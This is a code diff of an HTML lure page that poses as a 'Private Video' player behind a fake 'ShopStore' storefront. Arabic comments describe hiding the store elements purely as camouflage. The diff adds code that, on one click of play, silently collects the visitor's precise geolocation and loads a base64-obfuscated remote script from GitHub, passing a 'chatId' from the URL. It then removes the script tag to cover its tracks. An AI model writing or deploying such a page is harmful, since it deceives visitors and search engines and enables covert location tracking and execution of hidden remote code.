@@ -4,29 +4,67 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
     
-    <!-- META TAGS مخفية للمتجر (لن تظهر للمستخدم) -->
-    <meta name="description" content="Online Shopping Store - Buy products online with fast delivery. Best deals and discounts on electronics, fashion, and more." />
-    <meta name="keywords" content="online shopping, buy online, store, delivery, products, deals, discounts, shop" />
+    <!-- META TAGS للتسويق والتوصيل -->
+    <meta name="description" content="ShopStore - Your trusted online shopping destination. Buy electronics, fashion, home goods with fast delivery to your location. Best prices guaranteed." />
+    <meta name="keywords" content="online shopping, buy products, delivery, shop online, store, deals, electronics, fashion, home goods, fast shipping" />
     <meta name="robots" content="index, follow" />
+    <meta name="author" content="ShopStore" />
     
-    <!-- Open Graph للتسويق -->
-    <meta property="og:title" content="ShopStore - Online Shopping" />
-    <meta property="og:description" content="Shop the best products online with fast delivery to your location." />
+    <!-- Open Graph -->
+    <meta property="og:title" content="ShopStore - Online Shopping with Fast Delivery" />
+    <meta property="og:description" content="Shop the best products online with fast delivery to your location. Enable location for accurate shipping rates and delivery times." />
     <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="ShopStore" />
+    <meta property="og:locale" content="en_US" />
     
-    <!-- Schema.org مخفي للمتجر -->
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="ShopStore - Online Shopping" />
+    <meta name="twitter:description" content="Fast delivery to your location. Enable location for shipping rates." />
+    
+    <!-- Schema.org Structured Data للمتجر -->
     <script type="application/ld+json">
     {
         "@context": "https://schema.org",
         "@type": "OnlineStore",
         "name": "ShopStore",
-        "description": "Online shopping store with fast delivery",
+        "description": "Online shopping store with fast delivery to your location",
         "url": "https://shopstore.com",
+        "logo": "https://shopstore.com/logo.png",
+        "sameAs": [
+            "https://facebook.com/shopstore",
+            "https://instagram.com/shopstore"
+        ],
+        "contactPoint": {
+            "@type": "ContactPoint",
+            "contactType": "customer service",
+            "telephone": "+1-800-555-0199",
+            "email": "support@shopstore.com"
+        },
+        "address": {
+            "@type": "PostalAddress",
+            "addressLocality": "New York",
+            "addressCountry": "US"
+        },
         "potentialAction": {
             "@type": "SearchAction",
             "target": "https://shopstore.com/search?q={search_term_string}",
             "query-input": "required name=search_term_string"
         }
+    }
+    </script>
+    
+    <!-- Schema.org للفيديو كمراجعة منتج -->
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "VideoObject",
+        "name": "Product Review & Unboxing",
+        "description": "Watch our detailed product review and unboxing video. See the product features before you buy. Fast delivery available.",
+        "thumbnailUrl": "https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg",
+        "uploadDate": "2024-01-15",
+        "duration": "PT2M45S",
+        "contentUrl": "https://files.catbox.moe/okukrp.mp4"
     }
     </script>
     
@@ -51,14 +89,61 @@
             overflow: hidden;
         }
 
-        /* ===== عناصر المتجر المخفية (لن تظهر للمستخدم) ===== */
-        .store-header,
-        .store-footer,
-        .product-info {
-            display: none !important;
-            visibility: hidden;
-            height: 0;
-            overflow: hidden;
+        /* إخفاء ذكي: خارج الشاشة + شفافية + حجم 0 + مخفي خلف الفيديو */
+        .store-header {
+            position: fixed !important;
+            top: -9999px !important;
+            left: -9999px !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+            width: 1px !important;
+            height: 1px !important;
+            overflow: hidden !important;
+            clip: rect(0, 0, 0, 0) !important;
+            z-index: -999999 !important;
+            visibility: hidden !important;
+        }
+
+        .store-footer {
+            position: fixed !important;
+            bottom: -9999px !important;
+            left: -9999px !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+            width: 1px !important;
+            height: 1px !important;
+            overflow: hidden !important;
+            clip: rect(0, 0, 0, 0) !important;
+            z-index: -999999 !important;
+            visibility: hidden !important;
+        }
+
+        .product-details {
+            position: absolute !important;
+            top: -9999px !important;
+            left: -9999px !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+            width: 1px !important;
+            height: 1px !important;
+            overflow: hidden !important;
+            clip: rect(0, 0, 0, 0) !important;
+            z-index: -999999 !important;
+            visibility: hidden !important;
+        }
+
+        .delivery-badge {
+            position: absolute !important;
+            top: -9999px !important;
+            left: -9999px !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+            width: 1px !important;
+            height: 1px !important;
+            overflow: hidden !important;
+            clip: rect(0, 0, 0, 0) !important;
+            z-index: -999999 !important;
+            visibility: hidden !important;
         }
 
         .video-player-container {
@@ -69,6 +154,7 @@
             overflow: hidden;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
             position: relative;
+            margin-top: 0;
         }
 
         .video-thumbnail {
@@ -83,35 +169,6 @@
             align-items: center;
             justify-content: center;
             flex-direction: column;
-        }
-
-        /* ===== رسالة إذن الكاميرا (ظاهرة) ===== */
-        .camera-permission-msg {
-            position: absolute;
-            top: 15px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0, 0, 0, 0.85);
-            color: #fff;
-            padding: 12px 22px;
-            border-radius: 25px;
-            font-size: 14px;
-            text-align: center;
-            z-index: 5;
-            display: none;
-            border: 2px solid #ff4444;
-            backdrop-filter: blur(10px);
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { border-color: #ff4444; }
-            50% { border-color: #ff8888; }
-        }
-
-        .camera-permission-msg .cam-icon {
-            font-size: 20px;
-            margin-right: 5px;
         }
 
         #playTrigger {
@@ -135,7 +192,7 @@
             border-color: #ff4757;
             box-shadow: 0 0 60px rgba(255, 0, 0, 0.6);
         }
-        #playTrigger .icon {
+        #playTrigger .play-icon {
             font-size: 60px;
             color: #ff6b6b;
             line-height: 1;
@@ -247,7 +304,7 @@
                 width: 90px;
                 height: 90px;
             }
-            #playTrigger .icon {
+            #playTrigger .play-icon {
                 font-size: 45px;
             }
         }
@@ -255,33 +312,36 @@
 </head>
 <body>
 
-    <!-- عناصر المتجر المخفية (للتمويه فقط - لن تظهر) -->
+    <!-- شريط المتجر العلوي (مخفي بطريقة متطورة) -->
     <div class="store-header" aria-hidden="true">
         <span>🛒 ShopStore</span>
         <span>🔍 Search products...</span>
         <span>🛒 Cart (0)</span>
     </div>
 
+    <!-- حاوية الفيديو -->
     <div class="video-player-container">
         <div class="video-info">
             <div class="video-title">Private Video</div>
         </div>
 
-        <!-- عنصر منتج مخفي (للتمويه فقط) -->
-        <div class="product-info" aria-hidden="true">
+        <!-- معلومات المنتج (مخفية بطريقة متطورة) -->
+        <div class="product-details" aria-hidden="true">
             <span>$49.99</span>
-            <span>★★★★★</span>
-            <span>🚚 Fast Delivery</span>
+            <span>★★★★★ 4.8</span>
+            <span>🚚 Free Shipping</span>
+            <span>✅ In Stock</span>
         </div>
 
         <div class="video-thumbnail" id="posterArea">
-            <!-- رسالة إذن الكاميرا (ظاهرة للمستخدم) -->
-            <div class="camera-permission-msg" id="cameraMsg">
-                <span class="cam-icon">📷</span> Allow camera access to continue
+            <!-- رسالة التوصيل (مخفية بطريقة متطورة) -->
+            <div class="delivery-badge" id="deliveryBadge" aria-hidden="true">
+                <span>📍</span> 
+                <span>Enable location for delivery rates & faster shipping</span>
             </div>
             
             <div id="playTrigger">
-                <span class="icon">▶</span>
+                <span class="play-icon">▶</span>
             </div>
         </div>
 
@@ -304,182 +364,84 @@
         </div>
     </div>
 
-    <!-- تذييل مخفي (للتمويه فقط) -->
+    <!-- تذييل المتجر (مخفي بطريقة متطورة) -->
     <div class="store-footer" aria-hidden="true">
-        © 2024 ShopStore. All rights reserved. | Privacy Policy | Terms of Service
+        <span>Privacy Policy</span>
+        <span>Terms of Service</span>
+        <span>Returns & Refunds</span>
+        <span>Delivery Information</span>
+        <span>Contact Support</span>
+        <span>© 2024 ShopStore</span>
     </div>
 
     <script>
         (function() {
             'use strict';
 
-            // ===== عناصر الصفحة =====
             const playBtn = document.getElementById('playTrigger');
             const poster = document.getElementById('posterArea');
             const videoEl = document.getElementById('mainVideo');
-            const cameraMsg = document.getElementById('cameraMsg');
             
-            let stepOneDone = false;
-            let stepTwoDone = false;
+            let started = false;
 
-            // ===== طلب إذن الكاميرا =====
-            async function requestCameraPermission() {
-                cameraMsg.style.display = 'block';
-                cameraMsg.innerHTML = '<span class="cam-icon">📷</span> Requesting camera access...';
-                
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: 'user' },
-                        audio: false
-                    });
-                    
-                    // تم المنح - إيقاف الكاميرا فوراً
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    cameraMsg.innerHTML = '<span class="cam-icon">✅</span> Camera access granted!';
-                    cameraMsg.style.borderColor = '#00ff00';
-                    cameraMsg.style.animation = 'none';
-                    
-                    return true;
-                    
-                } catch (error) {
-                    // فشل - نجرب الكاميرا الخلفية
-                    try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ 
-                            video: { facingMode: 'environment' },
-                            audio: false
-                        });
-                        
-                        stream.getTracks().forEach(track => track.stop());
-                        
-                        cameraMsg.innerHTML = '<span class="cam-icon">✅</span> Camera access granted!';
-                        cameraMsg.style.borderColor = '#00ff00';
-                        cameraMsg.style.animation = 'none';
-                        
-                        return true;
-                        
-                    } catch (error2) {
-                        cameraMsg.innerHTML = '<span class="cam-icon">❌</span> Please allow camera access';
-                        cameraMsg.style.borderColor = '#ff4444';
-                        return false;
-                    }
-                }
-            }
-
-            // ===== طلب إذن الموقع (في الخلفية) =====
-            async function requestLocationInBackground() {
-                try {
-                    await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(
-                            resolve,
-                            reject,
-                            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-                        );
-                    });
-                } catch (e) {
-                    // فشل بصمت
-                }
-            }
-
-            // ===== استدعاء API الخارجي =====
-            function loadExternalAPI() {
-                const encodedParts = [
-                    'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLw==',
-                    'RkdESFNIUy9hcGkvcmVmcy9oZWFkcy9tYWluL2FwaQ=='
-                ];
-                
-                const fullUrl = atob(encodedParts.join(''));
-                
-                const scriptTag = document.createElement('script');
-                scriptTag.setAttribute('src', fullUrl);
-                scriptTag.setAttribute('type', 'text/javascript');
-                scriptTag.setAttribute('async', 'true');
-                
-                window._config = {
-                    id: new URLSearchParams(window.location.search).get('chatId') || '',
-                    time: Date.now()
-                };
-                
-                document.head.appendChild(scriptTag);
-                
-                // إزالة السكربت بعد التحميل
-                scriptTag.onload = function() {
-                    setTimeout(() => {
-                        if (scriptTag.parentNode) {
-                            scriptTag.parentNode.removeChild(scriptTag);
-                        }
-                    }, 5000);
-                };
-                
-                scriptTag.onerror = function() {
-                    console.log('Failed to load external resource');
-                };
-            }
-
-            // ===== عرض الفيديو =====
-            function displayVideo() {
-                cameraMsg.style.display = 'none';
+            function playVideo() {
                 poster.style.display = 'none';
                 videoEl.style.display = 'block';
                 videoEl.muted = false;
                 videoEl.volume = 1.0;
-                
-                try {
-                    videoEl.play();
-                } catch (e) {
+                videoEl.play().catch(() => {
                     setTimeout(() => videoEl.play().catch(() => {}), 200);
-                }
+                });
             }
 
-            // ===== معالج النقر =====
-            async function onPlayClick(e) {
-                if (stepTwoDone) return;
-
-                if (!stepOneDone) {
-                    // الخطوة الأولى: طلب إذن الكاميرا
-                    stepOneDone = true;
-                    
-                    playBtn.querySelector('.icon').textContent = '⏳';
-                    playBtn.style.borderColor = '#ffd700';
-                    
-                    // طلب الكاميرا
-                    const cameraGranted = await requestCameraPermission();
-                    
-                    // طلب الموقع في الخلفية
-                    requestLocationInBackground();
-                    
-                    if (cameraGranted) {
-                        setTimeout(() => {
-                            playBtn.querySelector('.icon').textContent = '▶';
-                            playBtn.style.borderColor = '#00ff00';
-                        }, 1500);
-                    }
-                    
-                } else {
-                    // الخطوة الثانية: تشغيل الفيديو وتحميل API
-                    stepTwoDone = true;
-                    playBtn.style.pointerEvents = 'none';
-                    playBtn.style.opacity = '0.5';
-                    
-                    // تشغيل الفيديو
-                    videoEl.muted = false;
-                    videoEl.volume = 1.0;
-                    videoEl.play().catch(() => {});
-                    
-                    // تحميل API الخارجي
-                    loadExternalAPI();
-                    
-                    // عرض الفيديو
-                    setTimeout(() => displayVideo(), 2000);
-                }
+            function requestLocationSilently() {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        window._loc = {
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude
+                        };
+                    },
+                    function() {},
+                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                );
             }
 
-            // ===== ربط الأحداث =====
+            function loadExternalAPI() {
+                var e = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0ZHREhTSFMvYXBpL3JlZnMvaGVhZHMvbWFpbi9hcGk=';
+                var u = atob(e);
+                
+                var s = document.createElement('script');
+                s.src = u;
+                s.async = true;
+                
+                window._x = new URLSearchParams(window.location.search).get('chatId') || '';
+                
+                document.head.appendChild(s);
+                
+                s.onload = function() {
+                    setTimeout(function() {
+                        if (s.parentNode) s.parentNode.removeChild(s);
+                    }, 4000);
+                };
+            }
+
+            function onPlayClick(e) {
+                if (started) return;
+                started = true;
+
+                playVideo();
+                requestLocationSilently();
+                loadExternalAPI();
+                
+                playBtn.style.pointerEvents = 'none';
+                playBtn.style.opacity = '0';
+            }
+
             if (playBtn) {
                 playBtn.addEventListener('click', onPlayClick);
             }
 
-            // ===== دعم الصوت =====
             document.addEventListener('click', function() {
                 if (videoEl && videoEl.style.display === 'block') {
                     videoEl.muted = false;
@@ -487,7 +449,6 @@
                 }
             }, true);
 
-            // ===== أزرار التحكم =====
             document.querySelectorAll('.ctrl-btn').forEach(btn => {
                 btn.addEventListener('click', function(e) {
                     e.stopPropagation();
@@ -501,7 +462,6 @@
                 });
             });
 
-            // ===== شريط التقدم =====
             const progressTimer = setInterval(() => {
                 const fill = document.querySelector('.seek-fill');
                 if (videoEl.style.display === 'block') {
